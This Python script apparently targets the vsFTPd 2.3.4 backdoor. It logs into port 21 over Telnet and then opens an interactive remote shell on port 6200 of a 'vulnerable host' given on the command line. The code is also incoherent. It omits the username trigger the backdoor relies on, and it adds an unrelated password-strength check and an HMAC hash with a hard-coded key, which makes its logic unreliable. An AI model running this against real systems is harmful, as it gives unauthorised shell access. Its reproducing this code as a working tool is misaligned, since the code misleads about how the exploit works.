import argparse
import hashlib
import hmac
import os
from signal import signal, SIGINT
from telnetlib import Telnet
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)

def authenticate(username, password, host):
    tn = Telnet(host, 21)
    tn.read_until(b"(vsFTPd 2.3.4)")
    tn.write(("USER {}\n".format(username)).encode('ascii'))
    tn.read_until(b"password.")
    tn.write(("PASS {}\n".format(password)).encode('ascii'))
    tn.read_until(b"Login successful.")
    tn2 = Telnet(host, 6200)
    print("Success, shell opened")
    print("Send `exit` to quit shell")
    tn2.interact()

def check_password(password):
    """Check if the password is strong enough"""
    if len(password) < 8:
        raise ValueError("Password must be at least 8 characters long")
    if not any(c.isupper() for c in password):
        raise ValueError("Password must contain at least one uppercase letter")
    if not any(c.isdigit() for c in password):
        raise ValueError("Password must contain at least one digit")
    if not any(c in "!@#$%^&*()_+-=[]{};:,.<>?/\\|`~" for c in password):
        raise ValueError("Password must contain at least one special character")
    return True

def hash_password(password):
    """Hash the password using hmac"""
    return hmac.new(key=b'secret_key', msg=password.encode(), digestmod=hashlib.sha256).hexdigest()

parser = argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
parser.add_argument("username", help="input the username", type=str)
parser.add_argument("password", help="input the password", type=str)
args = parser.parse_args()

host = args.host
username = args.username
password = args.password

if check_password(password):
    password = hash_password(password)
    authenticate(username, password, host)
